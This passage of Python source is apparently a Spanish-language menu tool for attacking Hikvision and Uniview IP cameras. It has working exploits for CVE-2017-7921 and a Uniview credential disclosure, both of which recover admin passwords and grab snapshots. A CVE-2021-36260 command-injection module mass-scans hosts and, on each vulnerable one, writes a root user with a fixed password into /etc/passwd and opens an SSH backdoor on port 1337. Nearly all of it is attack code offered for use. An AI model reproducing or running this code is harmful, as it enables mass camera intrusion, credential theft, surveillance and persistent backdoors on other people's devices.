            chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
            regExp = f"[{chars}]{{2,}}"
            return re.findall(regExp, file)

        try:
            xor = xore(decrypt(data))
            res = strings(xor.decode('ISO-8859-1', errors='ignore'))
            idx = -res[::-1].index('admin')
            return res[idx-1], res[idx]
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            return None, None

    def verify(self, ip, port=80):
        headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
        user_url = f"http://{ip}:{port}/Security/users?auth=YWRtaW46MTEK"
        config_url = f"http://{ip}:{port}/System/configurationFile?auth=YWRtaW46MTEK"
        try:
            res = requests.get(user_url, timeout=self.config.timeout, verify=False, headers=headers)
            if res.status_code == 200 and all(x in res.text for x in ['userName', 'priority', 'userLevel']):
                config_res = requests.get(config_url, timeout=self.config.timeout*2, verify=False, headers=headers)
                user, password = self._config_decryptor(config_res.content)
                if user and password:
                    return ip, str(port), self.product, user, password, self.__class__.__name__
        except Exception:
            return None
        return None

    def exploit(self, results):
        ip, port, _, user, password, _ = results
        img_file_name = f"{ip}-{port}-{user}-{password}-cve_2017_7921.jpg"
        url = f"http://{ip}:{port}/onvif-http/snapshot?auth=YWRtaW46MTEK"
        return self._snapshot(url, img_file_name)

POCTemplate.register_poc(CVE_2017_7921)

def run_cve_2017_7921():
    """Run the CVE-2017-7921 scanner."""
    print(f"{Fore.MAGENTA}=== Escáner CVE-2017-7921 (Hikvision) ==={Style.RESET_ALL}")
    config = {
        'ports': [80],
        'product': {'hikvision': 'Hikvision'},
        'timeout': 10,
        'out_dir': 'output',
        'ip_file': 'host.txt',
        'user_agent': get_user_agent(),
        'snapshots': 'snapshots',
        'vulnerable': 'results.csv',
        'not_vulnerable': 'not_vulnerable.csv',
    }
    Config = namedtuple('Config', config.keys())
    config = Config(**config)
    CoreBruteForce(config, [CVE_2017_7921]).run()

# ------------------- Uniview Disclosure Module -------------------
def passwd_decoder(passwd):
    """Decode Uniview password."""
    code_table = {
        '77': '1', '78': '2', '79': '3', '72': '4', '73': '5', '74': '6', '75': '7', '68': '8', '69': '9',
        '76': '0', '93': '!', '60': '@', '95': '#', '88': '$', '89': '%', '34': '^', '90': '&', '86': '*',
        '84': '(', '85': ')', '81': '-', '35': '_', '65': '=', '87': '+', '83': '/', '32': '\\', '0': '|',
        '80': ',', '70': ':', '71': ';', '7': '{', '1': '}', '82': '.', '67': '?', '64': '<', '66': '>',
        '2': '~', '39': '[', '33': ']', '94': '"', '91': "'", '28': '`', '61': 'A', '62': 'B', '63': 'C',
        '56': 'D', '57': 'E', '58': 'F', '59': 'G', '52': 'H', '53': 'I', '54': 'J', '55': 'K', '48': 'L',
        '49': 'M', '50': 'N', '51': 'O', '44': 'P', '45': 'Q', '46': 'R', '47': 'S', '40': 'T', '41': 'U',
        '42': 'V', '43': 'W', '36': 'X', '37': 'Y', '38': 'Z', '29': 'a', '30': 'b', '31': 'c', '24': 'd',
        '25': 'e', '26': 'f', '27': 'g', '20': 'h', '21': 'i', '22': 'j', '23': 'k', '16': 'l', '17': 'm',
        '18': 'n', '19': 'o', '12': 'p', '13': 'q', '14': 'r', '15': 's', '8': 't', '9': 'u', '10': 'v',
        '11': 'w', '4': 'x', '5': 'y', '6': 'z'
    }
    decoded = []
    for char in passwd.split(';'):
        if char != "124" and char != "0":
            decoded.append(code_table.get(char, ''))
    return ''.join(decoded)

class UniviewDisclosure(POCTemplate):
    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['uniview']
        self.level = POCTemplate.level.high

    def verify(self, ip, port=80):
        headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
        url = f"http://{ip}:{port}/cgi-bin/main-cgi?json={{\"cmd\":255,\"szUserName\":\"\",\"u32UserLoginHandle\":-1}}"
        try:
            r = requests.get(url, headers=headers, timeout=self.config.timeout, verify=False)
            if r.status_code == 200 and r.text:
                tree = ElementTree.fromstring(r.text)
                items = tree.find('UserCfg')
                if items is None:
                    logger.error(f"No UserCfg found in response from {ip}:{port}")
                    return None
                user = items[0].get('UserName')
                password = passwd_decoder(items[0].get('RvsblePass'))
                return ip, str(port), self.product, str(user), str(password), self.name
        except ElementTree.ParseError:
            logger.error(f"Invalid XML response from {ip}:{port}")
            return None
        except Exception as e:
            logger.error(f"Error during Uniview verification: {e}")
            return None

    def exploit(self, results):
        ip, port, _, user, password, _ = results
        img_file_name = f"{ip}-{port}-{user}-{password}-uniview.jpg"
        url = f"http://{ip}:{port}/snapshot"  # Replace with actual Uniview snapshot URL
        return self._snapshot(url, img_file_name, auth=HTTPDigestAuth(user, password))

POCTemplate.register_poc(UniviewDisclosure)

def run_uniview_disclosure():
    """Run the Uniview Disclosure scanner."""
    print(f"{Fore.MAGENTA}=== Escáner Uniview Disclosure ==={Style.RESET_ALL}")
    config = {
        'ports': [80],
        'timeout': 10,
        'out_dir': 'output',
        'ip_file': 'host.txt',
        'user_agent': get_user_agent(),
        'vulnerable': 'results.csv',
        'not_vulnerable': 'not_vulnerable.csv',
        'product': {'uniview': 'Uniview'},
    }
    Config = namedtuple('Config', config.keys())
    config = Config(**config)

    class CoreUniview:
        def __init__(self, config, selected_pocs=None):
            self.config = config
            self.selected_pocs = selected_pocs or POCTemplate.poc_classes
            self.vulnerable_count = 0

        def scan_ip(self, ip):
            for port in self.config.ports:
                for poc_class in self.selected_pocs:
                    poc = poc_class(self.config)
                    try:
                        result = poc.verify(ip, port)
                        if result:
                            self.vulnerable_count += 1
                            print(f"\n{Fore.RED}[!] Vulnerable: {Fore.CYAN}{ip}:{port}{Style.RESET_ALL}")
                            print(f"    {Fore.YELLOW}PoC: {Style.RESET_ALL}{result[5]}")
                            print(f"    {Fore.YELLOW}Credenciales: {Style.RESET_ALL}{result[3]}:{result[4]}")
                            with open(os.path.join(self.config.out_dir, self.config.vulnerable), 'a') as f:
                                f.write(f"{','.join(map(str, result))}\n")
                        else:
                            with open(os.path.join(self.config.out_dir, self.config.not_vulnerable), 'a') as f:
                                f.write(f"{ip},{port},{poc.name}\n")
                    except:
                        continue

        def run(self):
            os.makedirs(self.config.out_dir, exist_ok=True)
            ip_list = load_file(self.config.ip_file)
            if not ip_list:
                print(f"{Fore.RED}No hay IPs en {self.config.ip_file}{Style.RESET_ALL}")
                return

            total_ips = len(ip_list)
            print(f"{Fore.GREEN}Total IPs a escanear: {total_ips}{Style.RESET_ALL}")

            with ThreadPoolExecutor(max_workers=100) as executor:
                futures = [executor.submit(self.scan_ip, ip) for ip in ip_list]
                completed = 0
                for future in as_completed(futures):
                    future.result()
                    completed += 1
                    print(f"{Fore.CYAN}Progreso: {completed}/{total_ips} IPs comprobadas{Style.RESET_ALL}", end='\r')

            print("\n" + "="*40)
            print(f"{Fore.GREEN}Escaneo terminado{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Vulnerables encontrados: {Style.RESET_ALL}{self.vulnerable_count}")
            print("="*40)

    CoreUniview(config, [UniviewDisclosure]).run()

# ------------------- CVE-2021-36260 Module -------------------
class Http:
    def __init__(self, rhost, rport, proto, timeout=20):
        self.rhost = rhost
        self.rport = rport
        self.proto = proto
        self.timeout = timeout
        self.remote = requests.Session()
        self.uri = None
        self._init_uri()
        self.remote.headers.update({
            'Host': f'{self.rhost}:{self.rport}',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,sv;q=0.8',
        })

    def _init_uri(self):
        self.uri = f'{self.proto}://{self.rhost}:{self.rport}'

    def _update_host(self):
        if not self.remote.headers.get('Host') == self.uri[self.uri.rfind('://') + 3:]:
            self.remote.headers.update({'Host': self.uri[self.uri.rfind('://') + 3:]})

    def put(self, url, query_args, timeout):
        query_args = f'<?xml version="1.0" encoding="UTF-8"?><language>$({query_args})</language>'
        return self.remote.put(self.uri + url, data=query_args, verify=False, allow_redirects=False, timeout=timeout)

    def get(self, url, timeout):
        return self.remote.get(self.uri + url, verify=False, allow_redirects=False, timeout=timeout)

    def send(self, url=None, query_args=None, timeout=5, retries=2):
        for attempt in range(retries):
            try:
                if url and not query_args:
                    return self.get(url, timeout)
                else:
                    data = self.put('/SDK/webLanguage', query_args, timeout)
            except requests.exceptions.ConnectionError:
                if attempt == retries - 1:
                    print(f'{Fore.RED}[-] Failed to connect to {self.rhost}:{self.rport} after {retries} attempts{Style.RESET_ALL}')
                    return None
                self.proto = 'https' if self.proto == 'http' else 'https'
                self._init_uri()
                continue
            except requests.exceptions.RequestException as e:
                print(f'{Fore.RED}[-] Request error for {self.rhost}:{self.rport}: {str(e)}{Style.RESET_ALL}')
                return None
            except KeyboardInterrupt:
                return None
            if data.status_code == 302:
                redirect = data.headers.get('Location')
                self.uri = redirect[:redirect.rfind('/')]
                self._update_host()
                if url and not query_args:
                    return self.get(url, timeout)
                else:
                    data = self.put('/SDK/webLanguage', query_args, timeout)
            return data

def check(remote, args):
    if args.noverify:
        print(f'{Fore.YELLOW}[*] Not verifying remote "{args.rhost}:{args.rport}"{Style.RESET_ALL}')
        return True
    print(f'{Fore.CYAN}[*] Checking remote "{args.rhost}:{args.rport}"{Style.RESET_ALL}')
    data = remote.send(url='/', query_args=None)
    if data is None:
        print(f'{Fore.RED}[-] Cannot establish connection to "{args.rhost}:{args.rport}"{Style.RESET_ALL}')
        return None
    print(f'{Fore.CYAN}[i] ETag: {data.headers.get("ETag", "None")}{Style.RESET_ALL}')
    data = remote.send(query_args='>webLib/c')
    if data is None or data.status_code == 404:
        print(f'{Fore.RED}[-] "{args.rhost}:{args.rport}" does not appear to be Hikvision{Style.RESET_ALL}')
        return False
    status_code = data.status_code
    data = remote.send(url='/c', query_args=None)
    if not data or not data.status_code == 200:
        if status_code == 500:
            print(f'{Fore.YELLOW}[-] Could not verify if vulnerable (Code: {status_code}){Style.RESET_ALL}')
            return False
        else:
            print(f'{Fore.GREEN}[+] Remote is not vulnerable (Code: {status_code}){Style.RESET_ALL}')
            return False
    print(f'{Fore.RED}[!] Remote is verified exploitable{Style.RESET_ALL}')
    return True

def backdoor(remote, host, port, proto):
    data = remote.send(url='/N', query_args=None)
    if data.status_code == 404:
        print(f'{Fore.YELLOW}[i] Remote "{host}" not pwned, pwning now!{Style.RESET_ALL}')
        password_hash = md5_crypt.hash("Derian@1")
        data = remote.send(query_args=f'echo -n P:{password_hash}:0:0:W>N')
        if data.status_code == 401:
            print(data.headers)
            print(data.text)
            return False
        remote.send(query_args='echo :/:/bin/sh>>N')
        remote.send(query_args='cat N>>/etc/passwd')
        remote.send(query_args='dropbear -R -B -p 1337')
        remote.send(query_args='cat N>webLib/N')
    else:
        print(f'{Fore.YELLOW}[i] Remote "{host}" already pwned{Style.RESET_ALL}')
    print(f'{Fore.GREEN}[*] Backdoor set on {host}: SSH port 1337, user P, password Derian@1{Style.RESET_ALL}')

def run_cve_2021_36260():
    """Run the CVE-2021-36260 scanner."""
    print(f"{Fore.MAGENTA}=== Escáner CVE-2021-36260 (Hikvision) ==={Style.RESET_ALL}")
    if not os.path.exists('host.txt'):
        print(f"{Fore.RED}[-] Archivo host.txt no encontrado{Style.RESET_ALL}")
        return

    hosts = set()
    with open('host.txt', 'r') as f:
        for line in f:
            line = line.strip()
            if line:
                if ':' in line:
                    ip, port = line.split(':')
                    hosts.add((ip, int(port)))
                else:
                    hosts.add((line, 80))

    if not hosts:
        print(f"{Fore.RED}[-] No hay IPs en host.txt{Style.RESET_ALL}")
        return

    vulnerable = []
    lock = Lock()

    def check_ip(host_port):
        ip, port = host_port
        args = argparse.Namespace(
            rhost=ip, rport=port, proto='http', noverify=False, check=True, reboot=False, shell=False, cmd=None, cmd_blind=None, batch=True
        )
        remote = Http(ip, port, args.proto)
        if check(remote, args):
            with lock:
                vulnerable.append(f"{ip}:{port}")
            print(f'{Fore.GREEN}[+] {ip}:{port} es vulnerable{Style.RESET_ALL}')
            backdoor(remote, ip, port, args.proto)

    print(f"{Fore.CYAN}[*] Iniciando escaneo multi-hilo...{Style.RESET_ALL}")
    with ThreadPoolExecutor(max_workers=200) as executor:
        executor.map(check_ip, hosts)

    if vulnerable:
        with open('vulnerable.txt', 'w') as f:
            for host in vulnerable:
                f.write(host + '\n')
        print(f"{Fore.GREEN}[+] IPs vulnerables guardadas en vulnerable.txt{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}[+] No se encontraron IPs vulnerables{Style.RESET_ALL}")

# ------------------- Menu Interface -------------------
def display_menu():
    """Display the main menu."""
    print(f"\n{Fore.MAGENTA}=== Menú de Escaneo de Vulnerabilidades ==={Style.RESET_ALL}")
    print(f"{Fore.CYAN}Selecciona una opción:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}1: Scanner (Escaneo de Rango CIDR){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}2: Brute Force (Hikvision Weak Password){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}3: CVE-2017-7921 (Hikvision){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}4: Uniview Disclosure{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}5: CVE-2021-36260 (Hikvision){Style.RESET_ALL}")
    print(f"{Fore.RED}6: Exit{Style.RESET_ALL}")

def main():
    """Main function to run the menu-driven program."""
    while True:
        try:
            display_menu()
            choice = input(f"\n{Fore.YELLOW}Opción (1-6): {Style.RESET_ALL}").strip()
            print("\n" + "="*40)

            if choice == '1':
                run_scanner()
            elif choice == '2':
                run_brute_force()
            elif choice == '3':
                run_cve_2017_7921()
            elif choice == '4':
                run_uniview_disclosure()
            elif choice == '5':
                run_cve_2021_36260()
            elif choice == '6':
                print(f"{Fore.RED}Saliendo...{Style.RESET_ALL}")
                sys.exit(0)
            else:
                print(f"{Fore.RED}Opción inválida. Por favor, selecciona una opción entre 1 y 6.{Style.RESET_ALL}")

            print("\n" + "="*40)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Programa interrumpido por el usuario. Saliendo...{Style.RESET_ALL}")
            sys.exit(0)
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
            continue

if __name__ == '__main__':
    main()